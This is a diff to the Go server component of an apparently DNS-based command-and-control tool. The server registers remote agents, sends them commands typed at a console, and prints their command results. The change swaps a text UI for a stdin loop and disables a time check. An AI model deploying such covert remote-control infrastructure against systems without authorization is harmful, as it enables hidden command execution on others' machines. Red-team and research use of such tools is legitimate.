@@ -1,14 +1,16 @@
 package server
 
 import (
+	"bufio"
 	"bytes"
 	"compress/gzip"
 	"encoding/binary"
 	"fmt"
 	"io"
-	"math"
 	"os"
+	"os/signal"
 	"strings"
+	"syscall"
 	"time"
 
 	log "github.com/sirupsen/logrus"
@@ -54,7 +56,7 @@ func MessageHealthcheckHandler(Packet c2.MessagePacketWithSignature, q *dns.Msg)
 	if !ok {
 		log.Infof("Registering new agent in our Connected Agent List, %d agent(s) are connected", len(ConnectedAgents)+1)
 
-		UiAgentList.AddItem(Packet.Signature.String(), "", rune(len(ConnectedAgents)+65), nil)
+		// UiAgentList.AddItem(Packet.Signature.String(), "", rune(len(ConnectedAgents)+65), nil)
 		ConnectedAgents[Packet.Signature.String()] = agentStatusForServer{
 			NextMessageType:                 c2.MessageHealthcheck,
 			HealthCheckIntervalMilliSeconds: 10000, //todo: make this configurable
@@ -68,13 +70,13 @@ func MessageHealthcheckHandler(Packet c2.MessagePacketWithSignature, q *dns.Msg)
 	case c2.MessageHealthcheck: // no one else has claimed a new command for this agent, so I'm gonna go ahead and do the routine task and respond with a Pong
 		payload := []byte("Pong!")
 		// check time difference between packet time nad server time. anything after 10 seconds is unacceptable
-		// todo: fix this before removing the comment
-		if math.Abs(float64(Packet.Msg.TimeStamp-uint32(time.Now().Unix()))) > 10 {
-			agent.NextMessageType = c2.MessageSyncTime
-			ConnectedAgents[Packet.Signature.String()] = agent
-			// change payload to a UTC timestamp just in case the agent works better with payload than server's timestamp
-			payload = []byte(time.Now().Format("2006-01-02T15:04:05-0700"))
-		}
+		// todo: fix this before removing the comment. this doesn't take timezones into effect
+		// if math.Abs(float64(Packet.Msg.TimeStamp-uint32(time.Now().Unix()))) > 10 {
+		// 	agent.NextMessageType = c2.MessageSyncTime
+		// 	ConnectedAgents[Packet.Signature.String()] = agent
+		// 	// change payload to a UTC timestamp just in case the agent works better with payload than server's timestamp
+		// 	payload = []byte(time.Now().Format("2006-01-02T15:04:05-0700"))
+		// }
 		//todo: should we pass it on to MessageSyncTimeHandler function here?
 
 		// todo: check the actual next message time here and send a message appropriately
@@ -123,7 +125,8 @@ func displayCommandResult(fullPayload []byte, signature *cryptography.PublicKey)
 	if err == nil {
 		out, _ = io.ReadAll(r)
 	}
-	log.Infof("Command result: %s", out)
+	//todo: this could be a chat coming in from the agent, so "command result" might not be appropiate
+	fmt.Printf("Command result: %s\n", out)
 	// we only need the result printed in exec mode. in echo mode, this is just a "sent" tickbox
 	if conf.GlobalServerConfig.Mode == "exec" {
 		fmt.Fprintf(CommandWriter, "command result coming from %s:\n%s\n------\n", signature.String(), string(out))
@@ -286,9 +289,9 @@ func RemoveIdleAgents() {
 		if idleTime > 60 {
 			log.Infof("removing agent %s since it has been idle for %d seconds", k, idleTime)
 			delete(ConnectedAgents, k)
-			for i := range UiAgentList.FindItems(k, "", false, true) {
-				UiAgentList.RemoveItem(i)
-			}
+			// for i := range UiAgentList.FindItems(k, "", false, true) {
+			// 	UiAgentList.RemoveItem(i)
+			// }
 		}
 	}
 }
@@ -311,7 +314,7 @@ func HandleRunCommandAckFromAgent(Packet c2.MessagePacketWithSignature, q *dns.M
 	if err != nil {
 		log.Warnf("Error: %v", err) //todo:fix
 	}
-	// todo: go back to hne healthcheck handler and send the next packet
+	// todo: go back to the healthcheck handler and send the next packet
 	// todo: print output
 	q.Answer = append(q.Answer, cname)
 	return nil
@@ -413,11 +416,22 @@ func runDns(cmd *cobra.Command) {
 
 }
 
+// returns the first item of an arbitrary map
+func First(m map[string]agentStatusForServer) (out string) {
+	for k := range m {
+		out = k
+		break
+	}
+	// this should be unreachable
+	return
+}
+
 func RunServer(cmd *cobra.Command, args []string) {
 	// set global flag that we're running as server
 	conf.Mode = conf.RunAsServer
 	log.SetLevel(log.Level(conf.GlobalServerConfig.LogLevel))
-	if conf.GlobalAgentConfig.LogLevel == uint8(log.DebugLevel) {
+	if conf.GlobalServerConfig.LogLevel >= uint8(log.DebugLevel) {
+		fmt.Println("here") //todo:remove
 		log.SetReportCaller(true)
 	}
 	if conf.GlobalServerConfig.LogFile != "" {
@@ -425,10 +439,10 @@ func RunServer(cmd *cobra.Command, args []string) {
 		if err != nil {
 			log.Fatalf("error opening file: %v", err)
 		}
-		mw := io.MultiWriter(UiLog, f)
+		mw := io.MultiWriter(os.Stdout, f)
 		log.SetOutput(mw)
 	} else {
-		log.SetOutput(UiLog)
+		log.SetOutput(os.Stdout)
 	}
 
 	if conf.GlobalServerConfig.OutFile != "" {
@@ -436,9 +450,9 @@ func RunServer(cmd *cobra.Command, args []string) {
 		if err != nil {
 			log.Fatalf("error opening file: %v", err)
 		}
-		CommandWriter = io.MultiWriter(UiLog, f)
+		CommandWriter = io.MultiWriter(os.Stdout, f)
 	} else {
-		CommandWriter = UiLog
+		CommandWriter = os.Stdout
 	}
 
 	var err error
@@ -465,6 +479,38 @@ func RunServer(cmd *cobra.Command, args []string) {
 	conf.GlobalServerConfig.DnsSuffix = dnsSuffix
 
 	go runDns(cmd)
-	RunTui()
+
+	go func() {
+		reader := bufio.NewReader(os.Stdin)
+		for {
+			fmt.Print("-> ")
+			text, _ := reader.ReadString('\n')
+			// convert CRLF to LF
+			text = strings.Replace(text, "\n", "", -1)
+			agent := First(ConnectedAgents)
+			// agent, _ := UiAgentList.GetItemText(UiAgentList.GetCurrentItem())
+			pubkey, err := cryptography.PublicKeyFromString(agent)
+			if err != nil {
+				log.Errorln("can't find a key to send a message to")
+			} else if len(text) > 0 {
+				_ = SendMessageToAgent(pubkey, text)
+			}
+		}
+	}()
+
+	// handle interrupts
+	signalChannel := make(chan os.Signal, 2)
+	signal.Notify(signalChannel, os.Interrupt, syscall.SIGTERM)
+	go func() {
+		sig := <-signalChannel
+		switch sig {
+		case os.Interrupt:
+			os.Exit(0)
+		case syscall.SIGTERM:
+			os.Exit(0)
+		}
+	}()
+
+	select {}
 
 }
